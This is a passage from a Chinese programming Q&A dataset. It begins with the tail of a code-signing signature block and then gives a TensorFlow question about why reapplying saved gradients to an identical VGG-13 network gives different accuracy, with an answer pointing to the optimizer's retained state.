\ndEFzc3VyZWRJRFJvb3RDQS5jcmwwEQYDVR0gBAowCDAG\n\n\n''\n SIG \n''\n \nBgRVHSAAMA0GCSqGSIb3DQEBDAUAA4IBAQBwoL9DXFXn\n\n\n''\n SIG \n''\n \nOF+go3QbPbYW1\n/e/\nVwe9mqyhhyzshV6pGrsi+IcaaVQi\n\n\n''\n SIG \n''\n \n7aSId229GhT0E0p6Ly23OO\n/\n0\n/\n4C5+KH38nLeJLxSA8hO\n\n\n''\n SIG \n''\n \n0Cre+i1Wz\n/n096wwepqLsl7Uz9FDRJtDIeuWcqFItJnL\n\n''\n SIG \n''\n nU+nBgMTdydE1Od/\n6Fmo8L8vC6bp8jQ87PcDx4eo0kxA\n\n\n''\n SIG \n''\n \nGTVGamlUsLihVo7spNU96LHc\n/RzY9HdaXFSMb++hUD38\n\n''\n SIG \n''\n dglohJ9vytsgjTVgHAIDyyCwrFigDkBjxZgiwbJZ9VVr\n\n''\n SIG \n''\n zyerbHbObyMt9H5xaiNrIv8SuFQtJ37YOtnwtoeW/\nVvR\n\n\n''\n SIG \n''\n \nXKwYw02fc7cBqZ9Xql4o4rmUMYIDdjCCA3ICAQEwdzBj\n\n\n''\n SIG \n''\n \nMQswCQYDVQQGEwJVUzEXMBUGA1UEChMORGlnaUNlcnQs\n\n\n''\n SIG \n''\n \nIEluYy4xOzA5BgNVBAMTMkRpZ2lDZXJ0IFRydXN0ZWQg\n\n\n''\n SIG \n''\n \nRzQgUlNBNDA5NiBTSEEyNTYgVGltZVN0YW1waW5nIENB\n\n\n''\n SIG \n''\n \nAhAMTWlyS5T6PCpKPSkHgD1aMA0GCWCGSAFlAwQCAQUA\n\n\n''\n SIG \n''\n \noIHRMBoGCSqGSIb3DQEJAzENBgsqhkiG9w0BCRABBDAc\n\n\n''\n SIG \n''\n \nBgkqhkiG9w0BCQUxDxcNMjIxMTA4MjMzNTE1WjArBgsq\n\n\n''\n SIG \n''\n \nhkiG9w0BCRACDDEcMBowGDAWBBTzhyJNhjOCkjWplLy9\n\n\n''\n SIG \n''\n \nj5bp\n/hx8czAvBgkqhkiG9w0BCQQxIgQgj4P2QjO2zqJ2\n\n''\n SIG \n''\n Eiqqc6Xe0rmTwOL9WOhQO/\nA6JYbW780wNwYLKoZIhvcN\n\n\n''\n SIG \n''\n \nAQkQAi8xKDAmMCQwIgQgx\n/ThvjIoiSCr4iY6vhrE/\nE\n/m\n\n''\n SIG \n''\n eBwtZNBMgHVXoCO1tvowDQYJKoZIhvcNAQEBBQAEggIA\n\n''\n SIG \n''\n N4a6/\nPqXZ20xn5mtXpXGWnRHDSZmznxZ5uzEhJYQjFMQ\n\n\n''\n SIG \n''\n \nH6\n/tV8EIlSuOD4ubAQ2srfTxER8/\nKUYtUjo5CmhBFQ9y\n\n\n''\n SIG \n''\n \nN6eTJMdM2aZEFMBZZBUdB\n/\n6\nUahs697pg6ZN9yXJLP8/\nG\n\n\n''\n SIG \n''\n \n8LzIMFv5MrYGguVHMnLftBPGEqOll8IUwQHEu\n/jziluB\n\n''\n SIG \n''\n SAMWDQCdhq+VGkbeo8JUN1nbGr9/\nKXIp8rZ3ORobWFe2\n\n\n''\n SIG \n''\n \nd\n/CKlq2TgAAZ9QAPROg8Mpht8+G8tEpkP9vP0aB+wDoy\n\n''\n SIG \n''\n dlruYRaobgZd4T7hsoeVeWN2lL9PLCV1FpCNKX0Pg05y\n\n''\n SIG \n''\n MvXrldob51CzHTPPHde0buH3KJBJoRafMv5VMHGvaNNS\n\n''\n SIG \n''\n nOq1WXI44Zqw7/\ny7Ji++nCaIU9ITLjr5qLfPLgXqDWAa\n\n\n''\n SIG \n''\n \nhbwfLRagQ3rk9Px+r6V22ApHzHtGmGKnHhgZAI+MJ7HN\n\n\n''\n SIG \n''\n \nZc8Oh65qU1uQ2vsUq5fy3pbEuIRfZmn6AG9zMqsjqw3G\n\n\n''\n SIG \n''\n \n30pMnbSImYkKyTIb+jWC8vyLJqbirUaxpk+Iu4Mm9+ot\n\n\n''\n SIG \n''\n \nVV+6Ci3UgBssODRdSE9S3aKzGUbRFuWiriYVZxM\n/RJKM\n\n''\n SIG \n''\n qaP4cnqoAXvTuMv1zU1Iz3han3MQyD3CjAVd0BM5D0m/\n\n''\n SIG \n''\n \nOsomA1SK4FAVM6qaPsD444jVIVzPRNP0b5Kc0P8ER6Q\n/\n\n''\n SIG \n''\n HZvKs+BJqvWmPixPXGt6+KA=\n\n''\n SIG \n''\n End signature block\n\n\n", "Tag": "算法分析"}
{"Answer": "在上面给的代码的第164行处插入\n\noptimizer = optimizers.Adam(lr=1e-4)\n重新初始化optimizer，这样两个模型训练后的测试结果就一样了，望采纳", "Konwledge_Point": "NP完全问题", "Question": "tensorflow2.x 深度学习 使用相同梯度进行梯度下降的两个相同神经网络，得到的结果却不同\n用深度神经网络进行训练时，将每个step计算出的梯度grad保存进一个list（见下方代码段第20行）\n\n\n\n\n\nfor step, (x, y) in enumerate(train_db):\n    with tf.GradientTape() as tape:  # 构建梯度记录环境\n        # 插入通道维度，=>[b,32,32,1]\n        intermediate_out = conv_net(x, training=True)\n        intermediate_out = tf.reshape(intermediate_out, [-1, 512])\n        out = fc_net(intermediate_out, training=True)\n\n        # 真实标签 one-hot 编码，[b] => [b, 10]\n        y_one_hot = tf.one_hot(y, depth=10)\n        # 计算交叉熵损失函数，标量\n        loss = tf.losses.categorical_crossentropy(y_one_hot, out, from_logits=True)\n        loss = tf.reduce_mean(loss)\n\n    # 列表合并，合并 2 个子网络的参数\n    variables = conv_net.trainable_variables + fc_net.trainable_variables\n    # 对所有参数求梯度\n    grads = tape.gradient(loss, variables)\n    \n    # 将grads保存进一个list中\n    grad_list.append(grads)\n\n    optimizer.apply_gradients(zip(grads, variables))\n\n\n\n然后创建另一个一模一样的神经网络，并使用刚刚保存的grads-list中的每个grads依次对该神经网络进行梯度下降\n\n\n\n\n\n# 加载刚刚保存的相同的VGG-13网络，利用刚刚生成的grad进行梯度下降\nt_conv_net = models.load_model('conv_net0.h5', compile=False)\nt_fc_net = models.load_model('fc_net0.h5', compile=False)\n# 训练前测试一下模型准确率\nt_accuracy_before = run_test(t_conv_net, t_fc_net, test_db)\nprint(\"t_accuracy before train = \", t_accuracy_before)\n\nt_variables = t_conv_net.trainable_variables + t_fc_net.trainable_variables\n\nfor gg in grad_list:\n    optimizer.apply_gradients(zip(gg, t_variables))\n\n\n\n理论上经过这一轮训练，应该得到两个完全相同的训练后的模型，因为两个模型初始化相同，使用了相同的梯度grads进行梯度下降来训练它们的参数。然而结果却并非如此，第一个模型经过这一轮训练，测试准确率从0.11左右提升至了0.4左右；而第二个模型的测试准确率却几乎没有变化。\n\n\n\n\n\n\n请各位大佬指导一下，为什么使用相同的梯度进行梯度下降，却会得到不同的结果?万分感激！\n\n\n\n完整代码如下所示：\n\n\n\n\n\nimport os\nimport numpy as np\nimport math\nimport tensorflow as tf  # 导入 TF 库\nfrom tensorflow.keras import layers, Sequential, losses, optimizers, datasets, models\nimport matplotlib.pyplot as plt\n\n# 设置 GPU 显存使用方式为：为增长式占用-----------------------\ngpus = tf.config.experimental.list_physical_devices('GPU')\nif gpus:\n    try:  # 设置 GPU 为增长式占用\n        for gpu in gpus:\n            tf.config.experimental.set_memory_growth(gpu, True)\n    except RuntimeError as e:\n        # 打印异常\n        print(e)\n\nos.environ['TF_CPP_MIN_LOG_LEVEL'] = '2'\ntf.random.set_seed(2345)\n\n\ndef vgg13():\n    conv_layers = [\n        # 先创建包含多网络层的列表\n        # Conv-Conv-Pooling 单元 1\n        # 64 个 3x3 卷积核, 输入输出同大小\n        layers.Conv2D(64, kernel_size=[3, 3], padding=\"same\", activation=tf.nn.relu),\n        layers.Conv2D(64, kernel_size=[3, 3], padding=\"same\", activation=tf.nn.relu),\n        # 高宽减半\n        layers.MaxPool2D(pool_size=[2, 2], strides=2, padding='same'),\n\n        # Conv-Conv-Pooling 单元 2,输出通道提升至 128，高宽大小减半\n        layers.Conv2D(128, kernel_size=[3, 3], padding=\"same\", activation=tf.nn.relu),\n        layers.Conv2D(128, kernel_size=[3, 3], padding=\"same\", activation=tf.nn.relu),\n        layers.MaxPool2D(pool_size=[2, 2], strides=2, padding='same'),\n\n        # Conv-Conv-Pooling 单元 3,输出通道提升至 256，高宽大小减半\n        layers.Conv2D(256, kernel_size=[3, 3], padding=\"same\", activation=tf.nn.relu),\n        layers.Conv2D(256, kernel_size=[3, 3], padding=\"same\", activation=tf.nn.relu),\n        layers.MaxPool2D(pool_size=[2, 2], strides=2, padding='same'),\n\n        # Conv-Conv-Pooling 单元 4,输出通道提升至 512，高宽大小减半\n        layers.Conv2D(512, kernel_size=[3, 3], padding=\"same\", activation=tf.nn.relu),\n        layers.Conv2D(512, kernel_size=[3, 3], padding=\"same\", activation=tf.nn.relu),\n        layers.MaxPool2D(pool_size=[2, 2], strides=2, padding='same'),\n\n        # Conv-Conv-Pooling 单元 5,输出通道提升至 512，高宽大小减半\n        layers.Conv2D(512, kernel_size=[3, 3], padding=\"same\", activation=tf.nn.relu),\n        layers.Conv2D(512, kernel_size=[3, 3], padding=\"same\", activation=tf.nn.relu),\n        layers.MaxPool2D(pool_size=[2, 2], strides=2, padding='same')\n    ]\n\n    # 利用前面创建的层列表构建网络容器\n    conv_net = Sequential(conv_layers)\n\n    # 创建 3 层全连接层子网络\n    fc_net = Sequential([\n        layers.Dense(256, activation=tf.nn.relu),\n        layers.Dense(128, activation=tf.nn.relu),\n        layers.Dense(10, activation=None),\n    ])\n\n    # build2 个子网络，并打印网络参数信息\n    conv_net.build(input_shape=[None, 32, 32, 3])\n    fc_net.build(input_shape=[None, 512])\n\n    return conv_net, fc_net\n\n\ndef preprocess(x, y):\n    x = tf.cast(x, dtype=tf.float32) / 255.\n    y = tf.cast(y, dtype=tf.int32)  # 类型转换\n    return x, y\n\n\ndef generating_data_set(input_x, input_y, batch):\n    # 构建训练集对象，随机打乱，预处理，批量化\n    db = tf.data.Dataset.from_tensor_slices((input_x, input_y))\n    db = db.shuffle(1000).map(preprocess).batch(batch)  # 构建测试集对象，预处理，批量化\n    return db\n\n\ndef run_test(conv_net, fc_net, test_db):\n    # 记录预测正确的数量，总样本数量\n    correct_num, total_num = 0, 0\n    for x, y in test_db:  # 遍历所有训练集样本\n        # 插入通道维度，=>[b,28,28,1]\n        intermediate_out = conv_net(x, training=False)\n        intermediate_out = tf.reshape(intermediate_out, [-1, 512])\n        out = fc_net(intermediate_out, training=False)\n        # 先经过 softmax，再 argmax\n        prob = tf.nn.softmax(out, axis=1)\n        pred = tf.argmax(prob, axis=1)\n        pred = tf.cast(pred, dtype=tf.int32)\n\n        correct = tf.cast(tf.equal(pred, y), dtype=tf.int32)\n        correct = tf.reduce_sum(correct)\n        total_num += x.shape[0]\n        correct_num += int(correct)\n\n    # 计算准确率\n    accuracy = correct_num / total_num\n    return accuracy\n\n(x, y), (x_test, y_test) = datasets.cifar10.load_data()  # 数据集为cifar10\n# 删除 y 的一个维度，[b,1] => [b]\ny = tf.squeeze(y, axis=1)\ny_test = tf.squeeze(y_test, axis=1)\n\ntrain_db = generating_data_set(x, y, 128)\ntest_db = generating_data_set(x_test, y_test, 64)\n\ngrad_list = []  # 用于存储每个step产生的梯度grad\nconv_net, fc_net = vgg13()  # 使用的神经网络为VGG-13\noptimizer = optimizers.Adam(lr=1e-4)\n\n# 将神经网络保存\nconv_net.save('conv_net0.h5')\nfc_net.save('fc_net0.h5')\nprint(\"第一个模型：\")\n# 训练前测试一下模型准确率\naccuracy_before = run_test(conv_net, fc_net, test_db)\nprint(\"accuracy before train = \", accuracy_before)\n\nfor step, (x, y) in enumerate(train_db):\n    with tf.GradientTape() as tape:  # 构建梯度记录环境\n        # 插入通道维度，=>[b,32,32,1]\n        intermediate_out = conv_net(x, training=True)\n        intermediate_out = tf.reshape(intermediate_out, [-1, 512])\n        out = fc_net(intermediate_out, training=True)\n\n        # 真实标签 one-hot 编码，[b] => [b, 10]\n        y_one_hot = tf.one_hot(y, depth=10)\n        # 计算交叉熵损失函数，标量\n        loss = tf.losses.categorical_crossentropy(y_one_hot, out, from_logits=True)\n        loss = tf.reduce_mean(loss)\n\n    # 列表合并，合并 2 个子网络的参数\n    variables = conv_net.trainable_variables + fc_net.trainable_variables\n    # 对所有参数求梯度\n    grads = tape.gradient(loss, variables)\n\n    # 将grads保存进一个list中\n    grad_list.append(grads)\n\n    optimizer.apply_gradients(zip(grads, variables))\n\n# 训练后测试一下模型准确率\naccuracy_after = run_test(conv_net, fc_net, test_db)\nprint(\"accuracy after train = \", accuracy_after)\n\ndel conv_net\ndel fc_net\n\n# 加载刚刚保存的相同的VGG-13网络，利用刚刚生成的grad进行梯度下降\nt_conv_net = models.load_model('conv_net0.h5', compile=False)\nt_fc_net = models.load_model('fc_net0.h5', compile=False)\nprint(\"\\n第二个模型：\")\n# 训练前测试一下模型准确率\nt_accuracy_before = run_test(t_conv_net, t_fc_net, test_db)\nprint(\"t_accuracy before train = \", t_accuracy_before)\n\nt_variables = t_conv_net.trainable_variables + t_fc_net.trainable_variables\n\nfor gg in grad_list:\n    optimizer.apply_gradients(zip(gg, t_variables))\n\n# 训练后测试一下模型准确率\nt_accuracy_after = run_test(t_conv_net, t_fc_net, test_db)\nprint(\"t_accuracy after train = \", t_accuracy_after)\n", "Tag": "算法分析"}
